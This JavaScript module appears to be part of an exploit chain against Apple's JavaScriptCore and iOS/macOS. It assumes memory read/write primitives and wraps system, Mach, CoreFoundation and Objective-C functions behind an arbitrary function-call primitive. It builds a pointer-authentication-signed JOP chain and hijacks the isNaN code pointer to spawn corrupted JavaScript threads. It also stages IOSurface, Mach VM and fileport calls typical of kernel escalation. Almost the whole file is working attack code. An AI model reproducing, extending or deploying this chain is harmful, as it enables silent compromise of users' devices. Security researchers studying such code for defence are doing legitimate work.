fcall_init();

export const PAGE_SIZE = 0x4000n;
export const KERN_SUCCESS = 0n;

const CALLOC = func_resolve("calloc");
const MALLOC = func_resolve("malloc");
const FREE = func_resolve("free");
const MEMCPY = func_resolve("memcpy");
const MEMSET = func_resolve("memset");
const SLEEP = func_resolve("sleep");
const USLEEP = func_resolve("usleep");
const STRCMP = func_resolve("strcmp");
const STRCPY = func_resolve("strcpy");
const STRNCPY = func_resolve("strncpy");
const SNPRINTF = func_resolve("snprintf");
const PRINTF = func_resolve("printf");
const ERRNO = func_resolve("errno");
const CLOSE = func_resolve("close");
const EXIT = func_resolve("exit");
const GETCHAR = func_resolve("getchar");
const GETPID = func_resolve("getpid");
const SYSCALL = func_resolve("syscall");
const MACH_VM_ALLOCATE = func_resolve("mach_vm_allocate");
const MACH_VM_DEALLOCATE = func_resolve("mach_vm_deallocate");
const MACH_ERROR_STRING = func_resolve("mach_error_string");
const MACH_PORT_ALLOCATE = func_resolve("mach_port_allocate");
export const kIOMasterPortDefault = func_resolve("kIOMasterPortDefault");

export function assert(a, b = "N/A") {
    if (!a) {
        throw new Error(`assert failed: ${b}`);
    }
}

export function ERROR(a) {
    throw new Error(a);
}

export function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
}

export function mach_task_self() {
    return 0x203n;
}

export function calloc(...args) {
    return fcall(CALLOC, ...args);
}

export function malloc(...args) {
    return fcall(MALLOC, ...args);
}

export function free(...args) {
    return fcall(FREE, ...args);
}

export function memcpy(...args) {
    return fcall(MEMCPY, ...args);
}

export function memset(...args) {
    return fcall(MEMSET, ...args);
}

export function sleep(...args) {
    return fcall(SLEEP, ...args);
}

export function usleep(...args) {
    return fcall(USLEEP, ...args);
}

export function strcmp(...args) {
    return fcall(STRCMP, ...args);
}

export function strcpy(...args) {
    return fcall(STRCPY, ...args);
}

export function strncpy(...args) {
    return fcall(STRNCPY, ...args);
}

export function snprintf(...args) {
    return fcall(SNPRINTF, buf, size, fmt, 0n, 0n, 0n, 0n, 0n, ...args);
}

export function printf(...args) {
    return fcall(PRINTF, get_cstring(fmt), 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
}

export function close(...args) {
    return fcall(CLOSE, ...args);
}

export function exit(...args) {
    return fcall(EXIT, ...args);
}

export function getchar(...args) {
    return fcall(GETCHAR, ...args);
}

export function getpid(...args) {
    return fcall(GETPID, ...args);
}

export function syscall(num, ...args) {
    return fcall(SYSCALL, num, 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
}

export function mach_vm_allocate(...args) {
    return fcall(MACH_VM_ALLOCATE, ...args);
}

export function mach_vm_deallocate(...args) {
    return fcall(MACH_VM_DEALLOCATE, ...args);
}

export function mach_error_string(...args) {
    return fcall(MACH_ERROR_STRING, ...args);
}

export function mach_port_allocate(...args) {
    return fcall(MACH_PORT_ALLOCATE, ...args);
}

let g_device_machine = 0n;
export function get_device_machine() {
    if (g_device_machine == 0n) {
        let utsname = calloc(256n, 5n);
        fcall(UNAME, utsname);
        g_device_machine = utsname + 256n * 4n;
    }
    return g_device_machine;
}

const OBJC_ALLOC = func_resolve("objc_alloc");
const OBJC_ALLOC_INIT = func_resolve("objc_alloc_init");
const OBJC_GETCLASS = func_resolve("objc_getClass");
const OBJC_MSGSEND = func_resolve("objc_msgSend");
const SEL_REGISTERNAME = func_resolve("sel_registerName");
const CFDICTIONARYCREATEMUTABLE = func_resolve("CFDictionaryCreateMutable");
const CFDICTIONARYSETVALUE = func_resolve("CFDictionarySetValue");
const CFNUMBERCREATE = func_resolve("CFNumberCreate");
const CFRELEASE = func_resolve("CFRelease");
const CFSHOW = func_resolve("CFShow");
const CFSTRINGCREATECOPY = func_resolve("CFStringCreateCopy");
const CFSTRINGCREATEWITHCSTRING = func_resolve("CFStringCreateWithCString");

export const kCFAllocatorDefault = uread64(func_resolve("kCFAllocatorDefault").noPAC());
export const kCFStringEncodingUTF8 = 0x08000100n;
export const kCFTypeDictionaryKeyCallBacks = func_resolve("kCFTypeDictionaryKeyCallBacks").noPAC();
export const kCFTypeDictionaryValueCallBacks = func_resolve("kCFTypeDictionaryValueCallBacks").noPAC();

export function CFDictionaryCreateMutable(...args) {
    return fcall(CFDICTIONARYCREATEMUTABLE, ...args);
}

export function CFDictionarySetValue(...args) {
    return fcall(CFDICTIONARYSETVALUE, ...args);
}

export function CFNumberCreate(...args) {
    return fcall(CFNUMBERCREATE, ...args);
}

export function CFRelease(...args) {
    return fcall(CFRELEASE, ...args);
}

export function CFShow(...args) {
    return fcall(CFSHOW, ...args);
}

export function CFStringCreateCopy(...args) {
    return fcall(CFSTRINGCREATECOPY, ...args);
}

export function CFStringCreateWithCString(...args) {
    return fcall(CFSTRINGCREATEWITHCSTRING, ...args);
}

export function objc_alloc(class_obj) {
    return fcall(OBJC_ALLOC, class_obj);
}

export function objc_alloc_init(class_obj) {
    return fcall(OBJC_ALLOC_INIT, class_obj);
}

export function objc_getClass(class_name) {
    return fcall(OBJC_GETCLASS, get_cstring(class_name));
}

export function objc_msgSend(...args) {
    return fcall(OBJC_MSGSEND, ...args);
}

export function sel_registerName(cstr) {
    return fcall(SEL_REGISTERNAME, cstr);
}

export const selector_evaluateScript = sel_registerName(get_cstring("evaluateScript:"));
export const selector_initWithTarget_selector_object = sel_registerName(get_cstring("initWithTarget:selector:object:"));
export const selector_invocationWithMethodSignature = sel_registerName(get_cstring("invocationWithMethodSignature:"));
export const selector_invoke = sel_registerName(get_cstring("invoke"));
export const selector_isFinished = sel_registerName(get_cstring("isFinished"));
export const selector_methodSignatureForSelector = sel_registerName(get_cstring("methodSignatureForSelector:"));
export const selector_objectForKeyedSubscript = sel_registerName(get_cstring("objectForKeyedSubscript:"));
export const selector_release = sel_registerName(get_cstring("release"));
export const selector_retainCount = sel_registerName(get_cstring("retainCount"));
export const selector_setArgument_atIndex = sel_registerName(get_cstring("setArgument:atIndex:"));
export const selector_start = sel_registerName(get_cstring("start"));

export const invoke_class = objc_getClass("NSInvocation");
export const jsc_class = objc_getClass("JSContext");
export const nsthread_class = objc_getClass("NSThread");

export function create_cfstring(cstring) {
    return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
}

export const cfstr_boxed_arr = create_cfstring(get_cstring("boxed_arr"));
export const cfstr_control_array = create_cfstring(get_cstring("control_array"));
export const cfstr_control_array_8 = create_cfstring(get_cstring("control_array_8"));
export const cfstr_func_offsets_array = create_cfstring(get_cstring("func_offsets_array"));
export const cfstr_isNaN = create_cfstring(get_cstring("isNaN"));
export const cfstr_rw_array = create_cfstring(get_cstring("rw_array"));
export const cfstr_rw_array_8 = create_cfstring(get_cstring("rw_array_8"));
export const cfstr_unboxed_arr = create_cfstring(get_cstring("unboxed_arr"));

export function create_cfstring_copy(cfstring) {
    return CFStringCreateCopy(kCFAllocatorDefault, cfstring);
}

export function object_retainCount(obj) {
    return objc_msgSend(obj, selector_retainCount);
}

export function object_release(obj) {
    return objc_msgSend(obj, selector_release);
}

export function objectForKeyedSubscript(obj, cfstr_key) {
    return objc_msgSend(obj, selector_objectForKeyedSubscript, cfstr_key);
}

export function evaluateScript(obj, jscript) {
    return objc_msgSend(obj, selector_evaluateScript, jscript);
}

export function methodSignatureForSelector(obj, sel) {
    return objc_msgSend(obj, selector_methodSignatureForSelector, sel);
}

export function invocationWithMethodSignature(obj, sig) {
    return objc_msgSend(obj, selector_invocationWithMethodSignature, sig);
}

export function setArgument_atIndex(obj, arg, idx) {
    return objc_msgSend(obj, selector_setArgument_atIndex, arg, idx);
}

export function initWithTarget_selector_object(obj, target, sel, object) {
    return objc_msgSend(obj, selector_initWithTarget_selector_object, target, sel, object);
}

export function nsthread_start(obj) {
    return objc_msgSend(obj, selector_start);
}

export function setup_fcall_jopchain() {
    let jsvm_fcall_buff = malloc(PAGE_SIZE);
    let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
    let jsvm_fcall_args = jsvm_fcall_buff + 0x200n;
    uwrite64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
    uwrite64(jsvm_fcall_buff + 0x8n, pacia(load_x1x3x8, 0n));
    uwrite64(jsvm_fcall_buff + 0x10n, pacia(_CFObjectCopyProperty, 0n));
    uwrite64(jsvm_fcall_buff + 0x40n, pacia(jsvm_isNAN_fcall_gadget2, 0n));
    uwrite64(load_x1x3x8_args + 0x20n, load_x1x3x8_args + 0x40n);
    uwrite64(load_x1x3x8_args + 0x28n, jsvm_fcall_args - 0x10n);
    uwrite64(load_x1x3x8_args + 0x30n, pacia(0x41414141n, 0xC2D0n));
    uwrite64(load_x1x3x8_args + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));
    return {
        "jsvm_fcall_buff": jsvm_fcall_buff,
        "jsvm_fcall_pc": load_x1x3x8_args + 0x30n,
        "jsvm_fcall_args": jsvm_fcall_args
    };
}

let evaluateScript_invocation = 0n;
export function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n) {
    if (typeof js_script_nsstring === "string") {
        js_script_nsstring = create_cfstring(get_cstring(js_script_nsstring));
    } else if (typeof js_script_nsstring === "object") {
        js_script_nsstring = create_cfstring(uread64(addrof(js_script_nsstring) + 0x10n));
    } else {
        js_script_nsstring = create_cfstring_copy(js_script_nsstring);
    }
    let jop_chain_info = setup_fcall_jopchain();
    let jsvm_fcall_buff = jop_chain_info["jsvm_fcall_buff"];
    let jsvm_fcall_pc = jop_chain_info["jsvm_fcall_pc"];
    let jsvm_fcall_args = jop_chain_info["jsvm_fcall_args"];
    let ctx = objc_alloc_init(jsc_class);
    let isnan_value = objectForKeyedSubscript(ctx, cfstr_isNaN);
    let isnan_func_addr = uread64(isnan_value + 0x8n);
    let isnan_executable_addr = uread64(isnan_func_addr + 0x18n);
    let isnan_code_ptr = isnan_executable_addr + 0x28n;
    evaluateScript(ctx, stage1_js);
    let unboxed_arr_value = objectForKeyedSubscript(ctx, cfstr_unboxed_arr);
    let unboxed_arr_addr = uread64(unboxed_arr_value + 0x8n);
    let boxed_arr_value = objectForKeyedSubscript(ctx, cfstr_boxed_arr);
    let boxed_arr_addr = uread64(boxed_arr_value + 0x8n);
    let boxed_arr_butter = uread64(boxed_arr_addr + 0x8n);
    uwrite64(unboxed_arr_addr + 0x8n, boxed_arr_butter);
    let rw_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array) + 0x8n);
    let control_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array) + 0x8n);
    let rw_array_buffer_bk = uread64(rw_array_addr + 0x10n);
    let control_array_buffer_bk = uread64(control_array_addr + 0x10n);
    uwrite64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
    let rw_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array_8) + 0x8n);
    let control_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array_8) + 0x8n);
    let rw_array_8_buffer_bk = uread64(rw_array_8_addr + 0x10n);
    let control_array_8_buffer_bk = uread64(control_array_8_addr + 0x10n);
    uwrite64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
    let signing_ctx = 0x4911n;
    let signed_fcall_addr = pacib(jsvm_isNAN_fcall_gadget, signing_ctx);
    uwrite64(isnan_code_ptr, signed_fcall_addr);
    let new_func_offsets = objectForKeyedSubscript(ctx, cfstr_func_offsets_array);
    let new_func_offsets_addr = uread64(new_func_offsets + 0x8n);
    let new_func_offsets_buffer = uread64(new_func_offsets_addr + 0x10n);
    memcpy(new_func_offsets_buffer, func_offsets_buffer, PAGE_SIZE);
    uwrite64(new_func_offsets_buffer + 3n * 0x8n, target_thread_arg);
    uwrite64(new_func_offsets_buffer + 5n * 0x8n, jsvm_fcall_buff);
    uwrite64(new_func_offsets_buffer + 6n * 0x8n, jsvm_fcall_pc);
    uwrite64(new_func_offsets_buffer + 7n * 0x8n, jsvm_fcall_args);
    if (evaluateScript_invocation == 0n) {
        let evaluateScript_signature = methodSignatureForSelector(ctx, selector_evaluateScript);
        evaluateScript_invocation = invocationWithMethodSignature(invoke_class, evaluateScript_signature);
        setArgument_atIndex(evaluateScript_invocation, new_uint64_t(selector_evaluateScript), 1n);
    }
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(ctx), 0n);
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(js_script_nsstring), 2n);
    let nsthread = objc_alloc(nsthread_class);
    initWithTarget_selector_object(nsthread, evaluateScript_invocation, selector_invoke, 0n);
    nsthread_start(nsthread);
    return {
        "thread_handle": nsthread,
        "js_ctx": ctx,
        "jop_chain_info": jop_chain_info,
        "js_script_nsstring": js_script_nsstring,
        "rw_array_buffer_bk": rw_array_buffer_bk,
        "control_array_buffer_bk": control_array_buffer_bk,
        "rw_array_8_buffer_bk": rw_array_8_buffer_bk,
        "control_array_8_buffer_bk": control_array_8_buffer_bk
    };
}

export function js_thread_join(js_thread) {
    let jop_chain_info = js_thread["jop_chain_info"];
    let js_ctx = js_thread["js_ctx"];
    let js_script_nsstring = js_thread["js_script_nsstring"];
    let nsthread = js_thread["thread_handle"];
    while (true) {
        let isFinished = objc_msgSend(nsthread, selector_isFinished);
        if (isFinished == 1n) {
            break;
        }
    }
    object_release(nsthread);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array) + 0x8n) + 0x10n, js_thread["rw_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array) + 0x8n) + 0x10n, js_thread["control_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array_8) + 0x8n) + 0x10n, js_thread["rw_array_8_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array_8) + 0x8n) + 0x10n, js_thread["control_array_8_buffer_bk"]);
    let jsc_ref_count = object_retainCount(js_ctx);
    for (let i = 0n; i < jsc_ref_count; i++) {
        object_release(js_ctx);
    }
    CFRelease(js_script_nsstring);
    free(jop_chain_info["jsvm_fcall_buff"]);
}

export const RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;
export const VM_FLAGS_ANYWHERE = 1n;
export const VM_FLAGS_FIXED = 0n;
export const VM_FLAGS_OVERWRITE = 0x4000n;
export const VM_FLAGS_RANDOM_ADDR = 8n;
export const VM_INHERIT_NONE = 2n;
export const VM_PROT_DEFAULT = 3n;
export const PROT_READ = 0x1n;
export const PROT_WRITE = 0x2n;
export const MAP_SHARED = 0x1n;
export const AF_INET6 = 30n;
export const SOCK_DGRAM = 2n;
export const IPPROTO_ICMPV6 = 58n;
export const ICMP6_FILTER = 18n;
export const SEEK_SET = 0n;

const _NSGETEXECUTABLEPATH = func_resolve("_NSGetExecutablePath");
const ACCESS = func_resolve("access");
const CONFSTR = func_resolve("confstr");
const FCNTL = func_resolve("fcntl");
const FSYNC = func_resolve("fsync");
const FILEPORT_MAKEFD = func_resolve("fileport_makefd");
const FILEPORT_MAKEPORT = func_resolve("fileport_makeport");
const FOPEN = func_resolve("fopen");
const FCLOSE = func_resolve("fclose");
const FWRITE = func_resolve("fwrite");
const GETSOCKOPT = func_resolve("getsockopt");
const LSEEK = func_resolve("lseek");
const MACH_THREAD_SELF = func_resolve("mach_thread_self");
const MEMMEM = func_resolve("memmem");
const MEMSET_PATTERN8 = func_resolve("memset_pattern8");
const OPEN = func_resolve("open");
const PREADV = func_resolve("preadv");
const PWRITEV = func_resolve("pwritev");
const PWRITE = func_resolve("pwrite");
const PREAD = func_resolve("pread");
const READ = func_resolve("read");
const SETSOCKOPT = func_resolve("setsockopt");
const SOCKET = func_resolve("socket");
const STRCAT = func_resolve("strcat");
const STRSTR = func_resolve("strstr");
const STRLEN = func_resolve("strlen");
const STRNCMP = func_resolve("strncmp");
const STRRCHR = func_resolve("strrchr");
const PTHREAD_SELF = func_resolve("pthread_self");
const PTHREAD_JOIN = func_resolve("pthread_join");
const WRITE = func_resolve("write");
const REMOVE = func_resolve("remove");
const ARC4RANDOM = func_resolve("arc4random");
const TASK_THREADS = func_resolve("task_threads");
const THREAD_SUSPEND = func_resolve("thread_suspend");
const MACH_MAKE_MEMORY_ENTRY_64 = func_resolve("mach_make_memory_entry_64");
const MACH_PORT_DEALLOCATE = func_resolve("mach_port_deallocate");
const MACH_VM_MAP = func_resolve("mach_vm_map");
const MMAP = func_resolve("mmap");
const MLOCK = func_resolve("mlock");
const MUNLOCK = func_resolve("munlock");
const UNAME = func_resolve("uname");
const IOSURFACECREATE = func_resolve("IOSurfaceCreate");
const IOSURFACEPREFETCHPAGES = func_resolve("IOSurfacePrefetchPages");
const IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");

export const kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize").noPAC());

export function DUMP(addr, sz) {}

export function js_malloc(sz) {
    let buff = new Uint8Array(BigInt(sz).asInt32s).fill(0x00);
    return uread64(mem.addrof(buff) + 0x10n);
}

export function mach_thread_self() {
    return fcall(MACH_THREAD_SELF);
}

export function pthread_getspecific(key) {
    return fcall(PTHREAD_GETSPECIFIC, key);
}

export function pthread_self() {
    return fcall(PTHREAD_SELF);
}

export function pthread_join(thr, val) {
    return fcall(PTHREAD_JOIN, thr, val);
}

export function _NSGetExecutablePath(executable_path, length_ptr) {
    return fcall(_NSGETEXECUTABLEPATH, executable_path, length_ptr);
}

export function confstr(name, buf, len) {
    return fcall(CONFSTR, name, buf, len);
}

export function strrchr(s, c) {
    return fcall(STRRCHR, s, c);
}

export function strcat(s1, s2) {
    return fcall(STRCAT, s1, s2);
}

export function strlen(s) {
    return fcall(STRLEN, s);
}

export function strstr(s1, s2) {
    return fcall(STRSTR, s1, s2);
}

export function strncmp(s1, s2, n) {
    return fcall(STRNCMP, s1, s2, n);
}

export function socket(domain, type, protocol) {
    return fcall(SOCKET, domain, type, protocol);
}

export function getsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(GETSOCKOPT, socket, level, option_name, option_value, option_len);
}

export function setsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(SETSOCKOPT, socket, level, option_name, option_value, option_len);
}

export function fileport_makeport(fd, port) {
    return fcall(FILEPORT_MAKEPORT, fd, port);
}

export function fileport_makefd(port) {
    return fcall(FILEPORT_MAKEFD, port);
}

export function memset_pattern8(buf, val, sz) {
    return fcall(MEMSET_PATTERN8, buf, val, sz);
}

export function memmem(big, big_len, little, little_len) {
    return fcall(MEMMEM, big, big_len, little, little_len);
}

export function access(path, mode) {
    return fcall(ACCESS, path, mode);
}

export function open(path, mode) {
    return fcall(OPEN, path, mode);
}

export function fopen(path, mode) {
    return fcall(FOPEN, path, mode);
}

export function fclose(fd) {
    return fcall(FCLOSE, fd);
}

export function fwrite(buf, sz, nitem, fd) {
    return fcall(FWRITE, buf, sz, nitem, fd);
}

export function preadv(fildes, iov, iovcnt, offset) {
    return fcall(PREADV, fildes, iov, iovcnt, offset);
}

export function pwritev(fildes, iov, iovcnt, offset) {
    return fcall(PWRITEV, fildes, iov, iovcnt, offset);
}

export function pwrite(fildes, buff, size, offset) {
    return fcall(PWRITE, fildes, buff, size, offset);
}

export function pread(fildes, buff, size, offset) {
    return fcall(PREAD, fildes, buff, size, offset);
}

export function read(fd, buf, sz) {
    return fcall(READ, fd, buf, sz);
}

export function write(fd, buf, sz) {
    return fcall(WRITE, fd, buf, sz);
}

export function remove(path) {
    return fcall(REMOVE, path);
}

export function arc4random() {
    return fcall(ARC4RANDOM);
}

export function task_threads(task, thread_list_addr, thread_count_addr) {
    return fcall(TASK_THREADS, task, thread_list_addr, thread_count_addr);
}

export function fcntl(fd, flag, value) {
    return fcall(FCNTL, fd, flag, 0n, 0n, 0n, 0n, 0n, 0n, value);
}

export function lseek(fildes, offset, whence) {
    return fcall(LSEEK, fildes, offset, whence);
}

export function fsync(fd) {
    return fcall(FSYNC, fd);
}

export function IOSurfaceCreate(dict) {
    return fcall(IOSURFACECREATE, dict);
}

export function IOSurfaceGetBaseAddress(surface) {
    return fcall(IOSURFACEGETBASEADDRESS, surface);
}

export function IOSurfacePrefetchPages(surface) {
    return fcall(IOSURFACEPREFETCHPAGES, surface);
}

export function mach_make_memory_entry_64(target_task, size, offset, permission, object_handle, parent_entry) {
    return fcall(MACH_MAKE_MEMORY_ENTRY_64, target_task, size, offset, permission, object_handle, parent_entry);
}

export function mach_vm_map(target_task, address, size, mask, flags, object, offset, copy, cur_protection, max_protection, inheritance) {
    return fcall(MACH_VM_MAP, target_task, address, size, mask, flags, object, offset, copy, cur_protection | max_protection << 32n, inheritance);
}

export function mmap(addr, len, prot, flags, fd, offset) {
    return fcall(MMAP, addr, len, prot, flags, fd, offset);
}

export function mlock(address, size) {
    return fcall(MLOCK, address, size);
}

export function munlock(address, size) {
    return fcall(MUNLOCK, address, size);
}

export function mach_port_deallocate(task, name) {
    return fcall(MACH_PORT_DEALLOCATE, task, name);
}